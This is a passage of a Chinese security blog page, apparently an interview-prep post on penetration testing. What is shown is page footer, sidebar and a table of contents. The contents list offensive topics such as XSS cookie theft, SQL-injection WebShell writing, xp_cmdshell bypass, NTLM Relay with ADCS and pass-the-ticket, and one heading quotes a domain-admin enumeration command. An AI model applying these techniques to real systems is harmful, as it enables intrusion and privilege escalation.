rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95/">网安面试</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/26/%E5%9B%BD%E5%AD%A62_%E7%BB%86%E8%AF%B4%E5%85%AD%E5%8D%81%E4%BB%99%E5%91%BD%E4%B8%8E%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%B1%B1/" title="细说六十仙命配二十四山-杨CC"><img class="cover" src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">细说六十仙命配二十四山-杨CC</div></div><div class="info-2"><div class="info-item-1">1- 杨CC有话说 首先我们要知道二十四山\六十仙命,均为风水核心,所以本文以六十仙命配二十四山原文,以及个人理解,进行编译的文章.以让各位学者可以更好的理解风水学.本文核心为:六十仙命配二十四山 - 卷一 - 六十仙命坐山宜忌神煞.其中包含多种坐山宜忌神煞,可在左边的目录中,寻找对应的说法.  2- 卷一 - 六十仙命坐山宜忌神煞2.1 命冲 座山冲仙命,大凶不用.   如甲子命忌座午山,若座丙山兼午,或丁山兼午,亦忌不用.   那这是啥意思呢? 这里的座山,就是所谓的用山,也就是二十四山中的一山,而冲仙命,则就是与自身仙命对冲,则就是大凶,不可用. 而仙命,也就是所谓的六十甲子(也叫做六十花甲,也叫纳音),例如:甲子\乙丑\丙寅…等,在这里被称作为六十仙命(后续不再解释仙命的含义). 第二句.就是举了一个例子,甲子命,忌讳座午山.甲子命,座丙兼午山,则不用,座丁兼午山,则不用.  2.1.1 命冲 - 对照表   仙命 子 丑 寅 卯 辰 巳 午 未 申 酉 戌 亥    冲山 午 未 申 酉 戌 亥 子 丑 寅 卯 辰 巳   2.2 命杀三方 劫杀 \ 灾杀 \ 正杀 曰...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pic1.imgdb.cn/item/68a3e56758cb8da5c834abbf.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">杨CC</div><div class="author-info-description">这是一个非常不错的技术文章站点,包含森罗万物</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ycc77cn"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ycc77cn" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/500076166?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili" style="color: #00a1d6;"></i></a><a class="social-icon" href="https://v.douyin.com/xYSEAOWDpyk/" target="_blank" title="抖音"><i class="fa-brands fa-tiktok" style="color: #00a1d6;"></i></a><a class="social-icon" href="https://ycc77.cn/assets/css/img/jiaoliuqun2.jpg" target="_blank" title="微信交流群"><i class="fa-brands fa-weixin" style="color: #00a1d6;"></i></a><a class="social-icon" href="https://qm.qq.com/q/1P1FIz9mCg" target="_blank" title="QQ交流群"><i class="fa-brands fa-qq" style="color: ‘#00a1d6’;"></i></a><a class="social-icon" href="https://m.tb.cn/h.SVV6SYS?tk=qu0q4DsfaWK" target="_blank" title="闲鱼小店（可以支持一下）"><i class="fa-solid fa-fish" style="color: #00a1d6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">有任何疑惑或者需要投稿,请联系:<br>
微信: Yancy_76<br>
或 QQ: 1041041042 <br>
QQ交流群: 660264846 <br>
微信交流群:请添加:Yancy_76
</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%9D%A8CC%E6%9C%89%E8%AF%9D%E8%AF%B4"><span class="toc-number">1.</span> <span class="toc-text">1- 杨CC有话说</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B3%BB%E5%88%97"><span class="toc-number">2.</span> <span class="toc-text">2- 信息收集系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E7%9A%84%E6%B3%9B%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98"><span class="toc-number">2.0.1.</span> <span class="toc-text">如何处理子域名爆破的泛解析问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-CDN-%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9E-IP"><span class="toc-number">2.0.2.</span> <span class="toc-text">如何绕过 CDN 查找真实 IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo-%E9%A1%B5%E9%9D%A2%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">2.0.3.</span> <span class="toc-text">phpinfo 页面你会关注哪些信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.0.4.</span> <span class="toc-text">如何判断目标操作系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-CDN"><span class="toc-number">2.0.5.</span> <span class="toc-text">如何判断是否使用 CDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BA%86%E8%A7%A3%E8%BF%87-SVN-GIT-%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.0.6.</span> <span class="toc-text">有没有了解过 SVN&#x2F;GIT 源代码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF"><span class="toc-number">2.0.7.</span> <span class="toc-text">说说域信息收集思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.0.8.</span> <span class="toc-text">如何快速定位域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wappalyzer-%E6%80%8E%E4%B9%88%E8%BF%9B%E8%A1%8C%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%9A%84"><span class="toc-number">2.0.9.</span> <span class="toc-text">Wappalyzer 怎么进行指纹识别的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%A0%81%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.10.</span> <span class="toc-text">登录验证码怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">2.0.11.</span> <span class="toc-text">工作组环境下怎么判断是否有域环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%89%B9%E5%AE%9A%E7%9A%84%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.0.11.1.</span> <span class="toc-text">4. 特定的网络服务和端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BD%91%E5%8D%A1%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E4%B8%AD%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E7%BD%91%E6%AE%B5"><span class="toc-number">2.0.12.</span> <span class="toc-text">只有一个网卡通过什么方式判断内网中是否有其他网段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4-Webpack-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.0.13.</span> <span class="toc-text">说说 Webpack 信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net-group-%E2%80%9CDomain-Admins%E2%80%9D-domain-%E8%BF%99%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E7%AE%A1%E7%90%86%E5%91%98%E6%B2%A1%E6%9F%A5%E5%88%B0%EF%BC%8C%E9%82%A3%E4%B9%88%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%8C%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3"><span class="toc-number">2.0.14.</span> <span class="toc-text">net group “Domain Admins” &#x2F;domain 这条命令查询域内管理员没查到，那么可能出现了什么问题，怎么解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E4%B8%8A%E9%A2%98%EF%BC%8C%E8%BF%99%E6%9D%A1%E5%91%BD%E4%BB%A4%E7%9A%84%E6%9C%AC%E8%B4%A8%E7%A9%B6%E7%AB%9F%E6%98%AF%E5%8E%BB%E5%93%AA%E9%87%8C%E6%9F%A5"><span class="toc-number">2.0.15.</span> <span class="toc-text">继上题，这条命令的本质究竟是去哪里查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E5%8D%95%E4%BD%8D%E7%9A%84%E6%9C%BA%E5%99%A8%E6%98%AF%E5%93%AA%E7%A7%8D%E5%8D%8F%E8%AE%AE%E5%87%BA%E7%BD%91"><span class="toc-number">2.0.16.</span> <span class="toc-text">如何判断目标单位的机器是哪种协议出网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSE-%E8%84%9A%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">2.0.17.</span> <span class="toc-text">NSE 脚本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E7%9A%84-FIN-%E6%89%AB%E6%8F%8F%E5%92%8C%E7%A9%BA%E6%89%AB%E6%8F%8F%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.0.18.</span> <span class="toc-text">Nmap 的 FIN 扫描和空扫描是什么</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-XSS"><span class="toc-number">3.</span> <span class="toc-text">3- XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%88%B0-href-%E5%B1%9E%E6%80%A7%E7%9A%84-XSS-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">3.0.1.</span> <span class="toc-text">输出到 href 属性的 XSS 如何防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.2.</span> <span class="toc-text">XSS 绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.3.</span> <span class="toc-text">XSS 利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E6%80%8E%E4%B9%88%E6%89%93%E5%86%85%E7%BD%91"><span class="toc-number">3.0.4.</span> <span class="toc-text">XSS 怎么打内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-HttpOnly-%E8%8E%B7%E5%8F%96-Cookie"><span class="toc-number">3.0.5.</span> <span class="toc-text">XSS 如何绕过 HttpOnly 获取 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89-Shell-%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-XSS-%E5%AE%9E%E7%8E%B0%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%AB%99%E7%9A%84%E9%95%BF%E4%B9%85%E6%8E%A7%E5%88%B6"><span class="toc-number">3.0.6.</span> <span class="toc-text">有 Shell 的情况下如何使用 XSS 实现对目标站的长久控制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-CSRF%E7%B3%BB%E5%88%97"><span class="toc-number">4.</span> <span class="toc-text">4- CSRF系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SameSite-%E9%98%B2%E5%BE%A1-CSRF-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">4.0.1.</span> <span class="toc-text">SameSite 防御 CSRF 的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON-%E6%A0%BC%E5%BC%8F%E7%9A%84-CSRF-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">4.0.2.</span> <span class="toc-text">JSON 格式的 CSRF 如何防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ajax-%E5%8F%91%E9%80%81-POST-%E8%AF%B7%E6%B1%82%E4%BC%9A%E5%8F%91%E5%87%A0%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">4.0.3.</span> <span class="toc-text">Ajax 发送 POST 请求会发几个数据包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97"><span class="toc-number">5.</span> <span class="toc-text">5- SQL注入系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">5.0.1.</span> <span class="toc-text">SQL 报错注入函数有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-sleep-%E8%A2%AB%E7%A6%81%E7%94%A8%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.2.</span> <span class="toc-text">SQL 延时盲注 sleep() 被禁用怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-sleep-%E8%A2%AB%E7%A6%81%E7%94%A8%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87-1"><span class="toc-number">5.0.3.</span> <span class="toc-text">SQL 延时盲注 sleep() 被禁用怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%80%8E%E4%B9%88%E5%86%99%E5%85%A5-WebShell"><span class="toc-number">5.0.4.</span> <span class="toc-text">SQL 注入怎么写入 WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">5.0.4.1.</span> <span class="toc-text">利用步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.0.5.</span> <span class="toc-text">宽字节注入漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.0.6.</span> <span class="toc-text">二次注入漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.0.7.</span> <span class="toc-text">堆叠注入漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMap-%E5%8F%82%E6%95%B0-level-%E4%B8%8E-risk-%E5%8C%BA%E5%88%AB"><span class="toc-number">5.0.8.</span> <span class="toc-text">SQLMap 参数 level 与 risk 区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">5.0.9.</span> <span class="toc-text">MySQL 提权方式有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MMSQL-%E7%9A%84-xp-cmdshell-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.10.</span> <span class="toc-text">MMSQL 的 xp_cmdshell() 函数被禁用怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-5-0-%E4%BB%A5%E4%B8%8A%E5%92%8C-5-0-%E4%BB%A5%E4%B8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.0.11.</span> <span class="toc-text">MySQL 5.0 以上和 5.0 以下的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5-outfile-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.12.</span> <span class="toc-text">SQL 注入 outfile() 被过滤怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E4%B8%AD-Post-%E5%92%8C-Get-%E9%83%BD%E5%81%9A%E4%BA%86%E9%98%B2%E6%B3%A8%E5%85%A5%E5%8F%AF%E9%87%87%E7%94%A8%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.13.</span> <span class="toc-text">SQL 注入中 Post 和 Get 都做了防注入可采用什么方式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E7%9B%B2%E6%B3%A8-if-%E5%87%BD%E6%95%B0%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.14.</span> <span class="toc-text">SQL 盲注 if() 函数被过滤怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8-DNSLog-%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0"><span class="toc-number">5.0.15.</span> <span class="toc-text">SQL 注入无回显利用 DNSLog 如何构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-PostgreSQL"><span class="toc-number">5.0.15.1.</span> <span class="toc-text">3. PostgreSQL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#and-or-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.16.</span> <span class="toc-text">and or 被过滤怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMap-%E8%87%AA%E5%B8%A6%E8%84%9A%E6%9C%AC%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">5.0.17.</span> <span class="toc-text">SQLMap 自带脚本有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E5%87%BA%E5%90%8E%E7%BC%80%E4%B8%BA-asp-%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%B1%E7%A0%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">5.0.18.</span> <span class="toc-text">扫出后缀为 .asp 的数据库文件，访问乱码如何利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5%E7%82%B9%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E5%AF%B9%E6%96%B9%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">5.0.19.</span> <span class="toc-text">找到一个注入点怎么判断对方什么数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.20.</span> <span class="toc-text">单引号被过滤怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E4%B8%80%E4%B8%AA-%E5%92%8C%E4%B8%A4%E4%B8%AA-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.0.21.</span> <span class="toc-text">MySQL 一个 @ 和两个 @ 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-MMSQL-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">5.0.22.</span> <span class="toc-text">为什么 MMSQL 存储过程可以执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%83%B3%E9%80%9A%E8%BF%87-MMSQL-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E5%BC%80%E5%90%AF%E5%93%AA%E4%B8%AA%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">5.0.23.</span> <span class="toc-text">如果想通过 MMSQL 上传文件需要开启哪个存储过程的权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%B3%BB%E5%88%97"><span class="toc-number">6.</span> <span class="toc-text">6- 横向移动系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E7%94%A8%E5%88%B0%E7%9A%84%E4%BB%80%E4%B9%88%E7%B1%BB%E5%9E%8B%E7%9A%84-Beacon"><span class="toc-number">6.0.1.</span> <span class="toc-text">CS 上线不出网机器用到的什么类型的 Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E5%9C%A8%E5%9F%9F%E5%A4%96%E6%9C%89%E4%B8%80%E5%8F%B0%E5%B7%A5%E4%BD%9C%E7%BB%84%E6%9C%BA%E5%99%A8%E7%9A%84%E6%9D%83%E9%99%90%E4%BD%86%E6%B2%A1%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%94%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5%E5%9F%9F%E5%86%85%EF%BC%8C%E8%AF%B7%E9%97%AE%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E6%80%8E%E4%B9%88%E8%BF%9B%E5%85%A5%E5%9F%9F%E4%B8%AD%E6%89%BE%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.0.2.</span> <span class="toc-text">现在在域外有一台工作组机器的权限但没有域用户且无法直接通过漏洞进入域内，请问这种情况怎么进入域中找到域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-NTLM-Relay-%E9%85%8D%E5%90%88-ADCS-%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%83%85%E5%86%B5%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.0.3.</span> <span class="toc-text">利用 NTLM Relay 配合 ADCS 这个漏洞的情况需要什么条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E4%B8%8A%E9%A2%98%EF%BC%8CResponder-%E5%BA%94%E8%AF%A5%E5%BC%80%E5%9C%A8%E5%93%AA%E5%8F%B0%E6%9C%BA%E5%99%A8%E4%B8%8A%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88"><span class="toc-number">6.0.4.</span> <span class="toc-text">继上题，Responder 应该开在哪台机器上，为什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E4%B8%8A%E9%A2%98%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88-ADCS-%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E8%83%BD%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">6.0.5.</span> <span class="toc-text">继上题，为什么 ADCS 这个漏洞能获取域管理员权限，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%8B%BF%E5%88%B0%E4%BA%86%E4%B8%80%E5%A5%97-vCenter-%E7%9A%84%E6%9D%83%E9%99%90%EF%BC%8C%E5%A6%82%E4%BD%95%E5%8E%BB%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">6.0.6.</span> <span class="toc-text">如果拿到了一套 vCenter 的权限，如何去进一步深入利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0-vCenter-%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%EF%BC%8C%E4%BD%86%E9%83%A8%E5%88%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%84%E4%BA%8E%E9%94%81%E5%B1%8F%E7%8A%B6%E6%80%81%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">6.0.7.</span> <span class="toc-text">拿到 vCenter 管理员权限，但部分虚拟机处于锁屏状态怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">6.0.8.</span> <span class="toc-text">Kerberos 的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flannel%E3%80%81Calico-%E5%92%8C-Cilium-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">6.0.9.</span> <span class="toc-text">Flannel、Calico 和 Cilium 有什么区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTT-%E6%9C%89%E5%93%AA%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">6.0.10.</span> <span class="toc-text">PTT 有哪些攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTT-%E6%9C%89%E5%93%AA%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1"><span class="toc-number">6.0.11.</span> <span class="toc-text">PTT 有哪些攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 